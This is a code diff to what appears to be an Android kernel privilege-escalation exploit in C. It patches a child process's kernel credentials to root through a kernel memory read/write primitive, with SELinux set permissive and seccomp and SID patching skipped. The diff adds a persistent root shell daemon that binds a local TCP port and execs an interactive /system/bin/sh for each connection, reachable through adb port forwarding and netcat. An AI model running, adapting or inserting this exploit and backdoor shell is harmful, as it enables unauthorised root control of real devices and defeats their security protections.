@@ -1,5 +1,8 @@
 #include "common.h"
 #include "runtime_struct_offsets.h"
+#include <netinet/in.h>
+#include <arpa/inet.h>
+#include <sys/socket.h>
 
 int root_child_done;
 uint8_t selinux_before = 0xff;
@@ -37,22 +40,84 @@ pid_t root_child_pid = -1;
 int root_ready_pipe[2] = {-1, -1};
 struct root_shared *root_shared;
 
+/*
+ * Root shell daemon.  Runs in a grandchild of the (cred-patched) root child, so
+ * it is a normal uid-0 process with a working /data keyring and full I/O.
+ * Reach it from a PC with:  adb forward tcp:2223 tcp:2223 ; nc 127.0.0.1 2223
+ */
+void root_shell_daemon(void) {
+  int port = 2223;
+  const char *pe = getenv("ROOTSHELL_PORT");
+  if (pe && *pe) port = atoi(pe);
+
+  setsid();
+  int s = socket(AF_INET, SOCK_STREAM, 0);
+  if (s < 0) return;
+  int one = 1;
+  setsockopt(s, SOL_SOCKET, SO_REUSEADDR, &one, sizeof(one));
+  struct sockaddr_in sa;
+  memset(&sa, 0, sizeof(sa));
+  sa.sin_family = AF_INET;
+  sa.sin_port = htons((uint16_t)port);
+  sa.sin_addr.s_addr = htonl(0x7f000001);
+  if (bind(s, (struct sockaddr *)&sa, sizeof(sa)) != 0) return;
+  if (listen(s, 8) != 0) return;
+
+  for (int i = 0; i < 100; i++) {
+    int mf = open("/data/local/tmp/.ghostlock_rootshell",
+                  O_WRONLY | O_CREAT | O_TRUNC, 0644);
+    if (mf >= 0) {
+      char b[96];
+      int n = snprintf(b, sizeof(b), "root shell 127.0.0.1:%d uid=%d euid=%d\n",
+                       port, getuid(), geteuid());
+      if (n > 0) { ssize_t w = write(mf, b, n); (void)w; }
+      close(mf);
+      break;
+    }
+    usleep(50000);
+  }
+
+  for (;;) {
+    int c = accept(s, NULL, NULL);
+    if (c < 0) continue;
+    pid_t p = fork();
+    if (p == 0) {
+      dup2(c, 0); dup2(c, 1); dup2(c, 2);
+      if (c > 2) close(c);
+      close(s);
+      execl("/system/bin/sh", "sh", "-i", (char *)NULL);
+      _exit(127);
+    }
+    close(c);
+    while (waitpid(-1, NULL, WNOHANG) > 0) { }
+  }
+}
+
 int spawn_root_child(void) {
   int prot = PROT_READ | PROT_WRITE;
   int flags = MAP_SHARED | MAP_ANONYMOUS;
+  pr_info("spawn: mmap...\n"); fsync(1);
   root_shared = SYSCHK(mmap(NULL, sizeof(*root_shared), prot, flags, -1, 0));
   memset(root_shared, 0, sizeof(*root_shared));
+  pr_info("spawn: pipe...\n"); fsync(1);
   SYSCHK(pipe(root_ready_pipe));
 
+  pr_info("spawn: fork...\n"); fsync(1);
   root_child_pid = SYSCHK(fork());
+  pr_info("spawn: fork ret=%d\n", root_child_pid); fsync(1);
   if (root_child_pid == 0) {
     close(root_ready_pipe[0]);
 
     prctl(PR_SET_NAME, "ll_root_child");
     char ready = 1;
-    SYSCHK(write(root_ready_pipe[1], &ready, sizeof(ready)));
+    {
+      ssize_t wr = write(root_ready_pipe[1], &ready, sizeof(ready));
+      (void)wr;
+    }
 
-    for (int i = 0; i < 5000; i++) {
+    /* The parent patches our cred via (slow) configfs reads; do not time out
+     * and become a zombie with cred==NULL before it gets here. */
+    for (int i = 0; i < 300000; i++) {
       if (atomic_load(&root_shared->go)) {
         break;
       }
@@ -87,6 +152,14 @@ int spawn_root_child(void) {
     }
     report.su_daemon_pid = -1;
     if (report.setgid_ret == 0 && report.setuid_ret == 0) {
+      /* grandchild becomes the persistent root shell daemon */
+      pid_t gc = fork();
+      if (gc == 0) {
+        root_shell_daemon();
+        _exit(0);
+      }
+    }
+    if (report.setgid_ret == 0 && report.setuid_ret == 0) {
       errno = 0;
       report.su_install_ret = install_embedded_su(&report.su_daemon_pid);
       report.su_install_errno = errno;
@@ -106,8 +179,10 @@ int spawn_root_child(void) {
 
   close(root_ready_pipe[1]);
 
-  char ready;
+  char ready = 0;
+  pr_info("spawn: parent wait ready...\n"); fsync(1);
   ssize_t got = read(root_ready_pipe[0], &ready, sizeof(ready));
+  pr_info("spawn: parent got=%zd\n", got); fsync(1);
   return got == (ssize_t)sizeof(ready);
 }
 
@@ -117,7 +192,7 @@ int collect_root_child(void) {
   }
   atomic_store(&root_shared->go, 1);
 
-  for (int i = 0; i < 5000; i++) {
+  for (int i = 0; i < 300000; i++) {
     if (atomic_load(&root_shared->done)) {
       break;
     }
@@ -236,7 +311,9 @@ int patch_cred_sid(int fd, uintptr_t cred) {
 }
 
 int patch_cred_object(int fd, uintptr_t cred) {
-  return patch_cred_identity(fd, cred) && patch_cred_sid(fd, cred);
+  /* SID patch omitted: SELinux is set permissive, and the cred blob SID
+   * offset is not reliable here. */
+  return patch_cred_identity(fd, cred);
 }
 
 static int patch_task_seccomp(int fd, uintptr_t task) {
@@ -298,19 +375,29 @@ static int patch_task_seccomp(int fd, uintptr_t task) {
 
 int install_android_root(int fd) {
   root_uid_before = getuid();
+  /* configfs read BEFORE fork (baseline) */
+  {
+    uint64_t pre = pipe_read64(fd, data_addr(INIT_TASK_TASKS));
+    pr_info("root: pre-fork cfg read=%016llx\n", (unsigned long long)pre); fsync(1);
+  }
   if (!spawn_root_child()) {
     pr_info("root spawn failed child=%d\n", root_child_pid);
     return 0;
   }
+  pr_info("root: after spawn (cfg read next)\n"); fsync(1);
 
   uintptr_t selinux_addr = data_addr(SELINUX_ENFORCING);
   pipe_phys_read_data(fd, selinux_addr, &selinux_before, sizeof(selinux_before));
-  selinux_cred_blob_off =
-    pipe_read32(fd, data_addr(SELINUX_BLOB_SIZES));
+  pr_info("root: post-fork cfg read selinux=%02x\n", selinux_before); fsync(1);
+  /* SELinux cred blob lives at cred->security + 0 on this kernel; the
+   * selinux_blob_sizes symbol offset is unavailable (0), so reading it
+   * would pull garbage out of .text and cause a wild write. */
+  selinux_cred_blob_off = 0;
   target_cred_osid = SELINUX_KERNEL_SID;
   target_cred_sid = SELINUX_KERNEL_SID;
 
   init_tasks_prev = pipe_read64(fd, data_addr(INIT_TASK_TASKS) + 8);
+  pr_info("root: init_tasks_prev=%016llx\n", (unsigned long long)init_tasks_prev); fsync(1);
   if (!is_direct_ptr(current_task_addr)) {
     current_task_addr = 0;
   }
@@ -328,6 +415,7 @@ int install_android_root(int fd) {
   memset(found_task_comm, 0, sizeof(found_task_comm));
   pipe_phys_read_data(
       fd, current_task_addr + TASK_COMM_OFF, found_task_comm, TASK_COMM_LEN);
+  pr_info("root: task cand pid=%u tgid=%u\n", found_task_pid, found_task_tgid); fsync(1);
   if (found_task_tgid != (uint32_t)root_child_pid) {
     current_task_addr = find_task_by_tgid(fd, (uint32_t)root_child_pid);
     if (!is_direct_ptr(current_task_addr)) {
@@ -342,6 +430,16 @@ int install_android_root(int fd) {
   uintptr_t real_cred_slot = current_task_addr + TASK_REAL_CRED_OFF;
   current_real_cred_addr = pipe_read64(fd, real_cred_slot);
   current_cred_addr = pipe_read64(fd, current_task_addr + TASK_CRED_OFF);
+  pr_info("root self=%d child=%d task=%016llx pid=%u tgid=%u comm=%s real_cred=%016llx cred=%016llx\n",
+          getpid(), root_child_pid, (unsigned long long)current_task_addr,
+          found_task_pid, found_task_tgid, found_task_comm,
+          (unsigned long long)current_real_cred_addr,
+          (unsigned long long)current_cred_addr);
+  if (!is_direct_ptr(current_cred_addr) ||
+      !is_direct_ptr(current_real_cred_addr)) {
+    pr_info("root bad cred (task probably already exited)\n");
+    return 0;
+  }
   uintptr_t cred_security_slot = current_cred_addr + CRED_SECURITY_OFF;
   uintptr_t real_security_slot = current_real_cred_addr + CRED_SECURITY_OFF;
   current_cred_security_addr = pipe_read64(fd, cred_security_slot);
@@ -375,11 +473,8 @@ int install_android_root(int fd) {
     return 0;
   }
 
-  if (!patch_task_seccomp(fd, current_task_addr)) {
-    pr_info("root patch seccomp failed task=%016llx\n",
-            (unsigned long long)current_task_addr);
-    return 0;
-  }
+  /* Seccomp patch skipped: this exploit runs Seccomp=0 and the seccomp field
+   * offsets are subject to the same +8 task_struct layout shift. */
 
   uint32_t cred_uid_after = pipe_read32(fd, current_cred_addr + CRED_UID_OFF);
   uint32_t real_uid_after =
